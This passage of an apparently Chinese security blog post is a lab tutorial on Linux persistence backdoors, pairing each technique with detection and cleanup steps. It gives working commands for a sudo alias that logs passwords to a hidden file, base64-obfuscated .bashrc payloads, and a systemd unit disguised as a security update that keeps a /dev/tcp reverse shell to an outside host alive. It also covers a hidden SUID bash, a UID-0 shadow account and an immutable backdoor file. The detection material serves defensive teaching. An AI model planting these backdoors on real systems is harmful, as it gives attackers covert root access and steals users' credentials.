+<td><code>&amp;</code></td>
+<td>命令后台运行，避免阻塞 Shell 启动</td>
+</tr>
+</tbody></table>
+<p>步骤二：触发</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash</span><br><span class="line">exit &amp;&amp; ssh yxwa@10.10.1.81</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>bash</code></td>
+<td>启动新的 bash 进程，触发 <code>.bashrc</code> 加载</td>
+</tr>
+<tr>
+<td><code>exit</code></td>
+<td>退出当前 shell</td>
+</tr>
+<tr>
+<td><code>&amp;&amp;</code></td>
+<td>前一条命令成功后再执行后一条</td>
+</tr>
+</tbody></table>
+<p>步骤三：监听（Kali）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4445</span><br></pre></td></tr></table></figure>
+
+<p>隐蔽性技巧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Base64 编码：echo &#x27;eval $(echo &lt;base64编码&gt; | base64 -d)&#x27; &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure>
+
+<p>参数说明</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>eval</code></td>
+<td>执行字符串中的命令</td>
+</tr>
+<tr>
+<td><code>$(...)</code></td>
+<td>命令替换，将子命令输出作为参数</td>
+</tr>
+<tr>
+<td><code>base64 -d</code></td>
+<td>Base64 解码</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">命令别名劫持：</span><br><span class="line">alias sudo=&#x27;read -sp &quot;[sudo] password for $USER: &quot; pass; echo &quot;$pass&quot; &gt;&gt; /tmp/.passwd; echo &quot;$pass&quot; | /usr/bin/sudo -S &quot;$@&quot;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>参数说明</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>alias sudo=&#39;...&#39;</code></td>
+<td>将 sudo 替换为自定义命令</td>
+</tr>
+<tr>
+<td><code>read -sp &quot;...&quot; pass</code></td>
+<td>静默读取密码到变量 pass，<code>-s</code> 不回显，<code>-p</code> 提示信息</td>
+</tr>
+<tr>
+<td><code>echo &quot;$pass&quot; &gt;&gt; /tmp/.passwd</code></td>
+<td>将密码追加写入文件</td>
+</tr>
+<tr>
+<td><code>/usr/bin/sudo -S &quot;$@&quot;</code></td>
+<td>用 <code>-S</code> 从标准输入读取密码执行原 sudo</td>
+</tr>
+</tbody></table>
+<p>检测与清除</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">检测：</span><br><span class="line">cat ~/.bashrc</span><br><span class="line">cat /etc/profile</span><br><span class="line">grep -E &quot;tcp|base64|eval|wget|curl|nc &quot; ~/.bashrc</span><br><span class="line">alias</span><br></pre></td></tr></table></figure>
+
+<p>grep参数说明</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-E</code></td>
+<td>使用扩展正则表达式</td>
+</tr>
+<tr>
+<td>&#96;”tcp</td>
+<td>base64</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">清除：</span><br><span class="line">cp ~/.bashrc ~/.bashrc.bak</span><br><span class="line">nano ~/.bashrc</span><br><span class="line">source ~/.bashrc</span><br><span class="line">bash -n ~/.bashrc</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>cp</code></td>
+<td>备份原文件</td>
+</tr>
+<tr>
+<td><code>nano</code></td>
+<td>编辑文件删除恶意行</td>
+</tr>
+<tr>
+<td><code>source</code></td>
+<td>重新加载配置</td>
+</tr>
+<tr>
+<td><code>bash -n</code></td>
+<td>语法检查，不执行</td>
+</tr>
+</tbody></table>
+<p>四、Systemd服务后门（本实验需要root权限）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">核心目标：创建具有自动重启能力的服务。</span><br><span class="line">关键属性：</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>属性</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>ExecStart</code></td>
+<td>启动时执行的命令</td>
+</tr>
+<tr>
+<td><code>Restart=always</code></td>
+<td>进程退出时自动重启</td>
+</tr>
+<tr>
+<td><code>RestartSec=60</code></td>
+<td>重启前等待时间（秒）</td>
+</tr>
+<tr>
+<td><code>WantedBy=multi-user.target</code></td>
+<td>开机启动</td>
+</tr>
+</tbody></table>
+<p>步骤一：创建服务单元文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sudo -i</span><br><span class="line"></span><br><span class="line">cat &gt; /etc/systemd/system/system-update.service &lt;&lt; &#x27;EOF&#x27;</span><br><span class="line">[Unit]</span><br><span class="line">Description=System Security Update Service</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">ExecStart=/bin/bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.1.79/4446 0&gt;&amp;1&quot;</span><br><span class="line">Restart=always</span><br><span class="line">RestartSec=60</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
+
+<p>参数说明</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>sudo -i</code></td>
+<td>切换到 root 用户并加载其环境</td>
+</tr>
+<tr>
+<td><code>cat &gt; 文件 &lt;&lt; &#39;EOF&#39;</code></td>
+<td>将两个 EOF 之间的内容写入文件</td>
+</tr>
+<tr>
+<td><code>After=network.target</code></td>
+<td>网络就绪后再启动本服务</td>
+</tr>
+<tr>
+<td><code>Type=simple</code></td>
+<td>默认类型，主进程即为 ExecStart 启动的进程</td>
+</tr>
+</tbody></table>
+<p>步骤二：激活服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl enable system-update.service</span><br><span class="line">systemctl start system-update.service</span><br><span class="line">systemctl status system-update.service</span><br></pre></td></tr></table></figure>
+
+<p>systemctl参数说明</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>daemon-reload</code></td>
+<td>重新加载 systemd 配置</td>
+</tr>
+<tr>
+<td><code>enable &lt;服务名&gt;</code></td>
+<td>设置开机自启</td>
+</tr>
+<tr>
+<td><code>start &lt;服务名&gt;</code></td>
+<td>立即启动服务</td>
+</tr>
+<tr>
+<td><code>status &lt;服务名&gt;</code></td>
+<td>查看服务状态</td>
+</tr>
+</tbody></table>
+<p>步骤三：验证自动重启</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep &quot;bash -i&quot;</span><br><span class="line">kill -9 &lt;PID&gt;</span><br><span class="line">sleep 60</span><br><span class="line">ps aux | grep &quot;bash -i&quot;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>ps aux</code></td>
+<td>列出所有进程，<code>a</code> 全部用户，<code>u</code> 显示用户，<code>x</code> 无终端进程</td>
+</tr>
+<tr>
+<td><code>kill -9 &lt;PID&gt;</code></td>
+<td>强制终止指定进程</td>
+</tr>
+<tr>
+<td><code>sleep 60</code></td>
+<td>等待 60 秒</td>
+</tr>
+</tbody></table>
+<p>检测与清除</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">检测：</span><br><span class="line">systemctl list-unit-files --type=service | grep enabled</span><br><span class="line">ls -lat /etc/systemd/system/*.service | head -20</span><br><span class="line">systemctl cat &lt;服务名&gt;</span><br><span class="line">dpkg -S /etc/systemd/system/system-update.service</span><br></pre></td></tr></table></figure>
+
+<p>参数说明</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>systemctl list-unit-files --type=service</code></td>
+<td>列出所有服务单元文件</td>
+</tr>
+<tr>
+<td><code>ls -lat</code></td>
+<td>按修改时间倒序显示，<code>-l</code> 详细，<code>-a</code> 含隐藏，<code>-t</code> 按时间排序</td>
+</tr>
+<tr>
+<td><code>head -20</code></td>
+<td>只显示前 20 行</td>
+</tr>
+<tr>
+<td><code>dpkg -S &lt;文件&gt;</code></td>
+<td>查询文件属于哪个软件包</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">清除：</span><br><span class="line">sudo systemctl stop system-update.service</span><br><span class="line">sudo systemctl disable system-update.service</span><br><span class="line">sudo rm /etc/systemd/system/system-update.service</span><br><span class="line">sudo systemctl daemon-reload</span><br></pre></td></tr></table></figure>
+
+<p>五、SUID 二进制保留</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">核心目标：创建可控的 SUID 程序。（Linux 内核默认忽略脚本（如 .sh）的 SUID 位，SUID 必须依托编译型 ELF 二进制。）</span><br><span class="line">原理：SUID 程序的 EUID 会被设置为文件所有者的 UID。若文件属于 root 且设置了 SUID 位，任何用户执行时 EUID=0。</span><br></pre></td></tr></table></figure>
+
+<p>步骤一：创建 SUID 后门</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo -i</span><br><span class="line">cp /bin/bash /tmp/.suid_bash</span><br><span class="line">chmod u+s /tmp/.suid_bash</span><br><span class="line">ls -la /tmp/.suid_bash</span><br></pre></td></tr></table></figure>
+
+<p>参数说明</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>cp /bin/bash /tmp/.suid_bash</code></td>
+<td>复制 bash 到 &#x2F;tmp 并重命名为隐藏文件</td>
+</tr>
+<tr>
+<td><code>chmod u+s</code></td>
+<td>为文件属主添加 SUID 位</td>
+</tr>
+<tr>
+<td><code>ls -la</code></td>
+<td>详细列出文件，<code>-l</code> 长格式，<code>-a</code> 含隐藏文件</td>
+</tr>
+</tbody></table>
+<p>步骤二：普通用户提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su - yxwa</span><br><span class="line">/tmp/.suid_bash -p</span><br><span class="line">id</span><br></pre></td></tr></table></figure>
+
+<p>参数说明</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>su - yxwa</code></td>
+<td>切换到 yxwa 用户并加载其环境</td>
+</tr>
+<tr>
+<td><code>-p</code></td>
+<td>bash 的 privileged 参数，保持 EUID 不被重置</td>
+</tr>
+<tr>
+<td><code>id</code></td>
+<td>显示当前用户的 UID、GID、EUID</td>
+</tr>
+</tbody></table>
+<p>检测与清除</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>find 参数说明</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>/</code></td>
+<td>从根目录开始搜索</td>
+</tr>
+<tr>
+<td><code>-user root</code></td>
+<td>属主为 root</td>
+</tr>
+<tr>
+<td><code>-perm -4000</code></td>
+<td>权限包含 SUID 位</td>
+</tr>
+<tr>
+<td><code>-type f</code></td>
+<td>只搜索普通文件</td>
+</tr>
+<tr>
+<td><code>2&gt;/dev/null</code></td>
+<td>屏蔽权限不足的错误</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">清除：</span><br><span class="line">sudo rm /tmp/.suid_bash</span><br><span class="line">sudo chmod u-s /usr/local/bin/.update_service</span><br></pre></td></tr></table></figure>
+
+<p>六、UID&#x3D;0 影子用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">核心目标：创建具有 root 权限但不易被 sudoers 审计发现的账户。</span><br><span class="line">原理：/etc/passwd格式：用户名:x:UID:GID:注释:家目录:Shell。将某行的UID修改为0，该用户立即拥有 root权限。</span><br></pre></td></tr></table></figure>
+
+<p>实验步骤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo useradd -m -s /bin/bash support</span><br><span class="line">sudo passwd support</span><br><span class="line">sudo sed -i &#x27;s/^support:x:[0-9]*:[0-9]*:/support:x:0:0:/&#x27; /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>参数说明</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>useradd -m -s /bin/bash support</code></td>
+<td>创建 support 用户，<code>-m</code> 创建家目录，<code>-s</code> 指定 Shell</td>
+</tr>
+<tr>
+<td><code>passwd support</code></td>
+<td>为 support 用户设置密码</td>
+</tr>
+<tr>
+<td><code>sed -i</code></td>
+<td>直接修改文件，<code>-i</code> 表示原地编辑</td>
+</tr>
+<tr>
+<td><code>s/.../.../</code></td>
+<td>替换语法</td>
+</tr>
+<tr>
+<td><code>[0-9]*</code></td>
+<td>匹配任意数字</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">验证：</span><br><span class="line">su support</span><br><span class="line">id</span><br></pre></td></tr></table></figure>
+
+<p>检测与清除</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F: &#x27;($3 == 0) &#123;print&#125;&#x27; /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>awk 参数说明</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-F:</code></td>
+<td>以冒号为字段分隔符</td>
+</tr>
+<tr>
+<td><code>$3 == 0</code></td>
+<td>第三个字段（UID）等于 0</td>
+</tr>
+<tr>
+<td><code>&#123;print&#125;</code></td>
+<td>打印整行</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">清除：</span><br><span class="line">sudo sed -i &#x27;/^support:x:0:0:/d&#x27; /etc/passwd</span><br><span class="line">sudo rm -rf /home/support</span><br></pre></td></tr></table></figure>
+
+<p>七、不可变文件保护</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">核心目标：利用文件系统扩展属性防止后门文件被删除或修改。（/tmp默认挂载为tmpfs，不支持chattr +i，需在/var/tmp等物理磁盘目录执行。）</span><br><span class="line">原理：i（Immutable）属性使文件无法删除、修改、重命名，即使root用户亦受限制。</span><br></pre></td></tr></table></figure>
+
+<p>实验步骤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;Backdoor content&quot; &gt; /var/tmp/immortal_backdoor.txt</span><br><span class="line">sudo chattr +i /var/tmp/immortal_backdoor.txt</span><br></pre></td></tr></table></figure>
+
+<p>参数说明</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>echo &quot;...&quot; &gt; 文件</code></td>
+<td>将字符串写入文件（覆盖）</td>
+</tr>
+<tr>
+<td><code>chattr +i</code></td>
+<td>添加不可变属性，<code>+</code> 添加，<code>i</code> 不可变</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">验证：</span><br><span class="line">sudo rm -f /var/tmp/immortal_backdoor.txt</span><br><span class="line">echo &quot;new content&quot; &gt; /var/tmp/immortal_backdoor.txt</span><br></pre></td></tr></table></figure>
+
+<p>rm 参数说明</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-f</code></td>
+<td>强制删除，不提示</td>
+</tr>
+</tbody></table>
+<p>检测与清除</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsattr /var/tmp/immortal_backdoor.txt</span><br><span class="line">sudo lsattr -R /var/tmp 2&gt;/dev/null | grep -- &quot;----i&quot;</span><br></pre></td></tr></table></figure>
+
+<p>lsattr 参数说明</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-R</code></td>
+<td>递归列出目录下所有文件属性</td>
+</tr>
+<tr>
+<td><code>grep -- &quot;----i&quot;</code></td>
+<td>匹配包含 <code>----i</code> 的行，<code>--</code> 避免 <code>-i</code> 被当成选项</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">清除：</span><br><span class="line">sudo chattr -i /var/tmp/immortal_backdoor.txt</span><br><span class="line">sudo rm -f /var/tmp/immortal_backdoor.txt</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>chattr -i</code></td>
+<td>移除不可变属性</td>
+</tr>
+</tbody></table>
+<p>八、Capabilities</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">核心目标：理解 Linux Capabilities 机制。</span><br></pre></td></tr></table></figure>
+
+<p>概念：与 SUID 的对比：</p>
+<table>
+<thead>
+<tr>
+<th>对比项</th>
+<th>SUID</th>
+<th>Capabilities</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>ls -l</code> 是否可见</td>
+<td>是（有 <code>s</code>）</td>
+<td>否</td>
+</tr>
+<tr>
+<td><code>find -perm -4000</code> 是否可查</td>
+<td>是</td>
+<td>否</td>
+</tr>
+<tr>
+<td>查询工具</td>
+<td><code>ls -l</code></td>
+<td><code>getcap</code></td>
+</tr>
+</tbody></table>
+<p>检测命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>getcap 参数说明</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-r</code></td>
+<td>递归搜索指定目录</td>
+</tr>
+<tr>
+<td><code>/</code></td>
+<td>从根目录开始</td>
+</tr>
+</tbody></table>
+<p>清除</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setcap -r /path/to/file</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-r</code></td>
+<td>移除文件的所有 capability</td>
+</tr>
+</tbody></table>
+<p>九、SSH 登录钩子与 MOTD</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">核心目标：理解 SSH 登录钩子与 MOTD 动态生成机制。</span><br></pre></td></tr></table></figure>
+
+<p>SSH 登录钩子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sshd 在认证成功后、启动 Shell 前检查：</span><br><span class="line">	/etc/ssh/sshrc（系统级）</span><br><span class="line">	~/.ssh/rc（用户级）</span><br></pre></td></tr></table></figure>
+
+<p>MOTD 后门</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ubuntu的登录欢迎信息由/etc/update-motd.d/下的脚本以root权限动态生成。</span><br></pre></td></tr></table></figure>
+
+<p>检测命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -la /etc/ssh/sshrc ~/.ssh/rc</span><br><span class="line">ls -la /etc/update-motd.d/</span><br></pre></td></tr></table></figure>
+
+<p>ls 参数说明</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-l</code></td>
+<td>长格式显示</td>
+</tr>
+<tr>
+<td><code>-a</code></td>
+<td>包含隐藏文件（以 <code>.</code> 开头）</td>
+</tr>
+</tbody></table>
+<p>十、PAM 与 LD_PRELOAD</p>
+<p>PAM 原理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PAM是Linux的统一认证框架。恶意PAM模块可在认证流程中记录用户密码。</span><br></pre></td></tr></table></figure>
+
+<p>检测方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep -r &quot;pam_&quot; /etc/pam.d/</span><br><span class="line">ls -lt /lib/x86_64-linux-gnu/security/ | head</span><br></pre></td></tr></table></figure>
+
+<p>grep 参数说明</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-r</code></td>
+<td>递归搜索目录下所有文件</td>
+</tr>
+</tbody></table>
+<p>ls 参数说明</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-lt</code></td>
+<td>长格式并按修改时间排序</td>
+</tr>
+<tr>
+<td><code>head</code></td>
+<td>只显示前 10 行</td>
+</tr>
+</tbody></table>
+<p>LD_PRELOAD 原理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD指定的库优先级最高，可劫持系统库函数。经典应用：Hook read记录输入数据（包括密码）。</span><br></pre></td></tr></table></figure>
+
+<p>防御方向</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">监控/etc/ld.so.preload</span><br><span class="line">监控LD_PRELOAD环境变量</span><br><span class="line">关键程序使用静态编译</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag"># web安全</a>
+              <a href="/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" rel="tag"># 权限维持</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/10/20/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/" rel="prev" title="命令注入与参数注入">
+                  <i class="fa fa-angle-left"></i> 命令注入与参数注入
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2026/10/27/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" rel="next" title="文件包含漏洞">
+                  文件包含漏洞 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Xzt</span>
+  </div>
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+-->
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body>
+</html>
